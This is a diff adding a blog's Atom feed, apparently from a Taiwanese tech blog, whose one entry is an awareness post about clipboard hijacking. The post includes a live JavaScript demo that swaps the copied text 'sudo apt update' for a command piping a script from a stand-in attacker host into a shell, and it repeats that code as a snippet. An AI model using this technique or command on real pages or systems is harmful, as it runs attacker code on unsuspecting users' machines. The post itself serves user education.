@@ -1,0 +1,66 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://zonego.tw</id>
+    <title>筆記ZONE • Posts by &#34;資安&#34; tag</title>
+    <link href="https://zonego.tw" />
+    <updated>2022-04-27T11:44:03.000Z</updated>
+    <category term="Hexo" />
+    <category term="Blog" />
+    <category term="搜尋引擎" />
+    <category term="Self-Hosting" />
+    <category term="網路" />
+    <category term="Windows" />
+    <category term="Linux" />
+    <category term="Mac" />
+    <category term="Apple Silicon" />
+    <category term="VM 虛擬機" />
+    <category term="DNS" />
+    <category term="Google" />
+    <category term="廣告" />
+    <category term="網站架設" />
+    <category term="Cloudflare" />
+    <category term="靜態網站" />
+    <category term="Git" />
+    <category term="資安" />
+    <category term="網路資源" />
+    <category term="CI/CD" />
+    <category term="Drone" />
+    <category term="Gitea" />
+    <category term="GMail" />
+    <category term="套件管理" />
+    <category term="字型" />
+    <category term="環境變數" />
+    <category term="Ubuntu" />
+    <category term="桌布" />
+    <category term="DIY" />
+    <category term="Wiki JS" />
+    <category term="Keyckoak" />
+    <category term="身分認證" />
+    <entry>
+        <id>https://zonego.tw/2022/04/27/copy-past/</id>
+        <title>注意複製貼上內容</title>
+        <link rel="alternate" href="https://zonego.tw/2022/04/27/copy-past/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;注意複製貼上內容&#34;&gt;&lt;a href=&#34;#注意複製貼上內容&#34; class=&#34;headerlink&#34; title=&#34;注意複製貼上內容&#34;&gt;&lt;/a&gt;注意複製貼上內容&lt;/h2&gt;&lt;p&gt;我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!&lt;/p&gt;
+&lt;p&gt;複製這個指令試試看&lt;/p&gt;
+&lt;p id=&#34;copy&#34;&gt;sudo apt update&lt;/p&gt;
+
+&lt;script&gt;
+document.getElementById(&#39;copy&#39;).addEventListener(&#39;copy&#39;, function(e) { e.clipboardData.setData(&#39;text/plain&#39;, &#39;curl http://attacker-domain:8000/shell.sh | sh\n&#39;); e.preventDefault(); });
+&lt;/script&gt;
+
+&lt;p&gt;把剛剛複製的貼這邊&lt;/p&gt;
+&lt;textarea style=&#34;height: 100px; min-height: 100px; width:100%; resize: none;&#34; cols=&#34;30&#34; name=&#34;textarea&#34; rows=&#34;5&#34; placeholder=&#34;Paste your safe text here...&#34;&gt;&lt;/textarea&gt;
+
+
+&lt;p&gt;中間的奧秘就是用 JavaScript 達到改寫複製的內容&lt;/p&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;getElementById&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-title function_&#34;&gt;addEventListener&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;e&lt;/span&gt;) &amp;#123; &lt;br&gt;    e.&lt;span class=&#34;hljs-property&#34;&gt;clipboardData&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;setData&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;text/plain&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;curl http://attacker-domain:8000/shell.sh | sh\n&amp;#x27;&lt;/span&gt;); &lt;br&gt;    e.&lt;span class=&#34;hljs-title function_&#34;&gt;preventDefault&lt;/span&gt;(); &lt;br&gt;&amp;#125;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;所以，在貼上之前記得先貼到記事本檢查，&lt;strong&gt;不要直接貼到終端機使用&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;來源&#34;&gt;&lt;a href=&#34;#來源&#34; class=&#34;headerlink&#34; title=&#34;來源&#34;&gt;&lt;/a&gt;來源&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.wizer-training.com/blog/copy-paste&#34;&gt;https://www.wizer-training.com/blog/copy-paste&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="資安" />
+        <category term="網路資源" />
+        <updated>2022-04-27T11:44:03.000Z</updated>
+    </entry>
+</feed>
